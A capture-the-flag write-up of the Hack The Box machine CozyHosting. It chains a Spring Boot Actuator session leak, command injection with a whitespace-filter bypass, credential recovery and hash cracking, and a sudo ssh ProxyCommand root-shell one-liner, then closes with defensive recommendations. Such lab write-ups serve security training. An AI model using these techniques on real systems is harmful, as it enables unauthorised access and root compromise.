---
title: "CozyHosting — Actuator Session Leak and sudo ssh ProxyCommand Escalation"
description: "A Spring Boot Actuator session leak grants admin access, and command injection in the SSH feature provides a foothold; credentials from the application JAR and an SSH ProxyCommand sudo rule lead to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - spring-boot
  - command-injection
objective: "Escalate from an exposed Spring Boot Actuator endpoint to root through command injection and a sudo ssh rule"
tools:
  - rustscan
  - feroxbuster
  - curl
  - 7z
  - psql
  - hashcat
  - ssh
  - sudo
skill: "Spring Boot Actuator abuse and Linux privilege escalation via a sudo ssh rule"
outcome: "Authenticated admin access, a command-injection foothold as the application service user, SSH access through reused credentials, and root via ssh ProxyCommand"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux (Ubuntu) with an nginx reverse proxy in front of a Spring Boot application |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an exposed Spring Boot Actuator endpoint to root through command injection and a sudo ssh rule |
| Outcome | Admin-panel access via a leaked session, command-injection shell as the application service user, SSH access through a reused credential, and root via `ssh` ProxyCommand |

## Actuator session leak to ProxyCommand root

CozyHosting is an Easy Hack The Box Linux machine running a Spring Boot web application behind nginx. Enumeration exposed Spring Boot Actuator endpoints, including `/actuator/sessions`, which leaked an authenticated session for `<APPLICATION_USER>`. The admin panel's SSH connection feature passed the `username` parameter into a shell command, which allowed command injection, and bash brace expansion bypassed a whitespace filter to land a foothold as the application service user. The deployed Spring Boot JAR contained cleartext PostgreSQL credentials, whose `users` table held bcrypt hashes; cracking the administrative hash recovered a password reused for the local `<LOCAL_USER>` account. Privilege escalation abused a sudo rule allowing `<LOCAL_USER>` to run `/usr/bin/ssh` as root and used `ProxyCommand` to spawn a root shell. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Spring Boot Actuator session leak → admin panel access → command injection in the SSH feature → application-service-user shell → JAR and PostgreSQL credential recovery → bcrypt hash crack → password reuse for SSH access as `<LOCAL_USER>` → sudo `/usr/bin/ssh` `ProxyCommand` → root**

## Target, Spring Boot stack, and objective

- **Target:** Linux (Ubuntu) host running nginx as a reverse proxy to a Spring Boot application.
- **Exposed services:** SSH (22) and HTTP (80).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from the exposed web application to user- and root-level access, and demonstrate the impact of the exposure chain.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: Actuator sessions to sudo ssh helper

### 1. Service Enumeration

Observation: a full port scan identifies two services and the web tier's technology.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://<TARGET_VHOST>
```

Significance: the HTTP service redirects to a virtual host, so content discovery requires the hostname to resolve locally; SSH is the eventual interactive shell service.

Result: SSH and an nginx-fronted web service are exposed.

### 2. Web Enumeration and Actuator Discovery

Observation: directory enumeration first exposes a login page and, with a second wordlist, a Spring Boot Actuator endpoint.

```bash
feroxbuster --url http://<TARGET_VHOST> --wordlist <WORDLIST>
```

```text
200      GET        1l        1w      634c http://<TARGET_VHOST>/actuator
```

Significance: Spring Boot Actuator endpoints expose operational information, so the management surface of a Spring Boot deployment is a priority target.

Result: the `/actuator` endpoint is reachable without authentication.

### 3. Session Leak via Actuator

Observation: I checked the Actuator's `sessions` endpoint, which exposes active HTTP sessions.

```bash
curl -s http://<TARGET_VHOST>/actuator/sessions
```

```text
{"<SESSION_ID>":"<APPLICATION_USER>"}
```

Significance: an active session identifier and its owning account leak in cleartext; replaying the identifier as the `JSESSIONID` cookie authenticates as that user.

Result: authenticated access to the admin panel as `<APPLICATION_USER>` with the leaked session cookie.

### 4. Command Injection in the SSH Feature

Observation: the admin panel's SSH connection feature builds a shell command from `host` and `username`, and a trailing `;` in `username` reaches the shell.

```http
POST /executessh HTTP/1.1
Host: <TARGET_VHOST>
Cookie: JSESSIONID=<SESSION_ID>
Content-Type: application/x-www-form-urlencoded

host=<ATTACKER_IP>&username=;
```

```http
HTTP/1.1 302
Location: http://<TARGET_VHOST>/admin?error=usage: ssh [...]
/bin/bash: line 1: @<ATTACKER_IP>: command not found
```

Significance: the redirected response reflects shell output inside the `error` parameter, so attacker-controlled input reaches a shell command.

Result: command injection is confirmed, but a filter rejects payloads containing spaces.

```text
Username can't contain whitespaces!
```

Bash brace expansion supplies separated arguments without literal spaces, so the same parameter executes commands past the filter.

```http
host=<ATTACKER_IP>&username=;<COMMAND_INJECTION_PATTERN>
```

Significance: brace expansion (`{cmd,arg1,arg2}`) produces a command line with arguments but no whitespace characters, so a whitespace-only filter provides no protection.

Result: a reverse shell comes back as the application service user.

```text
<APPLICATION_SERVICE_USER>@<TARGET_HOST>:<APPLICATION_DIRECTORY>$ whoami
<APPLICATION_SERVICE_USER>
```

### 5. Credential Extraction and Lateral Movement

Observation: the application directory holds the deployed Spring Boot JAR.

```bash
<APPLICATION_SERVICE_USER>@<TARGET_HOST>:<APPLICATION_DIRECTORY>$ ls
cloudhosting-0.0.1.jar
```

```bash
7z x cloudhosting-0.0.1.jar -o./cloudhosting_extracted
cat cloudhosting_extracted/BOOT-INF/classes/application.properties
```

```properties
spring.datasource.url=jdbc:postgresql://<DATABASE_HOST>:<DATABASE_PORT>/<DATABASE_NAME>
spring.datasource.username=<DATABASE_USER>
spring.datasource.password=<DB_PASSWORD>
```

Significance: configuration inside a deployable artifact stores database credentials in cleartext, so any process that can read the JAR recovers them.

Result: the packaged configuration yields PostgreSQL credentials. Querying the `users` table returns bcrypt hashes.

```sql
SELECT * FROM users;
```

```text
<APPLICATION_USER> | <BCRYPT_HASH_1> | User
<APPLICATION_ADMIN> | <BCRYPT_HASH_2> | Admin
```

Observation: the stored hashes are bcrypt, which is slow to brute force but crackable offline against a wordlist.

```bash
hashcat -m 3200 '<BCRYPT_HASH_2>' <WORDLIST> -D 2
```

Result: the administrative hash cracks offline against the wordlist. The recovered password value is not reproduced.

Observation: the recovered password is reused for the local `<LOCAL_USER>` account, and SSH accepts it.

```bash
ssh <LOCAL_USER>@<TARGET_HOST>
```

Significance: reuse of a recovered application password for a system account turns a database disclosure into host access.

Result: SSH access as `<LOCAL_USER>` succeeds with the reused password.

### 6. Privilege Escalation via sudo ssh ProxyCommand

Observation: `<LOCAL_USER>` may run the OpenSSH client as root with arbitrary arguments.

```bash
sudo -l
```

```text
User <LOCAL_USER> may run the following commands on <TARGET_HOST>:
    (root) /usr/bin/ssh *
```

Significance: the wildcard grants arbitrary OpenSSH options. `ProxyCommand` executes a local helper command to establish the connection, and because sudo runs `ssh` as root, that helper executes with root privileges.

Result: the wildcard rule runs a helper command as root.

```bash
sudo /usr/bin/ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

```text
# whoami
root
```

## One obstacle: a whitespace filter, bypassed by braces

- The `username` parameter rejected whitespace. Bash brace expansion (`{cmd,arg1,arg2}`) supplied separated arguments without literal spaces and so bypassed the filter.
- The admin panel trusted user-controlled input inside a shell command; the whitespace filter alone was insufficient to prevent injection.

## Outcome: admin, service shell, and root via ProxyCommand

The documented path runs from unauthenticated web access to root command execution. Two transitions are documented results, not captured command output: admin-panel access using the leaked session, and SSH access as `<LOCAL_USER>` with the recovered password. I could not verify either from the captured output.

## Recommendations: Actuator, injection, artifact secrets, reuse, and sudo ssh

The compromise supports these recommendations, but no follow-up validation is documented.

1. **Unauthenticated Actuator exposure.** Management endpoints reachable without authentication let an unauthenticated party read an active session identifier and account from `/actuator/sessions`. *Recommendation:* keep Actuator off untrusted networks, restrict it with network controls, and disable or secure `sessions` and other sensitive endpoints in production. *Detection:* monitor requests to management/`actuator` paths from outside expected hosts.
2. **Command injection in the SSH feature.** User-controlled input reached a shell command, and a whitespace filter failed because bash brace expansion passes arguments without literal spaces. *Recommendation:* never build shell commands from user input; use parameterized APIs or strict allow-listing of host and user values. *Detection:* inspect SSH-feature parameters for shell metacharacters (`;`, `{`, `}`) and alert on matches.
3. **Secrets in deployable artifacts.** The Spring Boot JAR embedded cleartext PostgreSQL credentials in `application.properties`, recoverable by any process able to read the artifact. *Recommendation:* keep secrets out of build artifacts and inject them at runtime from environment variables or a secrets manager.
4. **Password reuse across trust boundaries.** A cracked application hash reused for a local system account enabled host access. *Recommendation:* enforce unique credentials per service and account boundary, and rotate application and system credentials independently. *Detection:* correlate application account names against local OS accounts during review.
5. **Sudo rule for a flexible binary.** Permitting `<LOCAL_USER>` to run `/usr/bin/ssh` as root with a wildcard grants arbitrary argument control, and `ProxyCommand` executes a helper command as root. *Recommendation:* scope sudo rules to specific commands and argument patterns, and treat any wildcard rule for a command-capable binary such as `/usr/bin/ssh *` as equivalent to root. *Detection:* audit sudoers for wildcard rules on interpreters, shells, or tunnel-capable clients.

## References

- [Hack The Box — CozyHosting](https://app.hackthebox.com/machines/CozyHosting) (retired machine)
- [Spring Boot Actuator endpoints (Spring Boot reference)](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)
- [RustScan](https://github.com/RustScan/RustScan) (fast TCP port scanner)
- [feroxbuster](https://github.com/epi052/feroxbuster) (content discovery)
- [hashcat](https://hashcat.net/hashcat/) (offline hash cracking)
- [psql — PostgreSQL interactive terminal (PostgreSQL documentation)](https://www.postgresql.org/docs/current/app-psql.html)
- [7-Zip](https://7-zip.org/) (archive and JAR extraction)
- [ssh_config(5) — OpenBSD manual](https://man.openbsd.org/ssh_config) (`ProxyCommand` behavior)
- [GTFOBins — ssh](https://gtfobins.github.io/gtfobins/ssh/) (documented sudo escalation via `ProxyCommand`)
- [sudoers manual (Sudo Project)](https://www.sudo.ws/docs/man/sudoers.man/) (command and argument matching)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
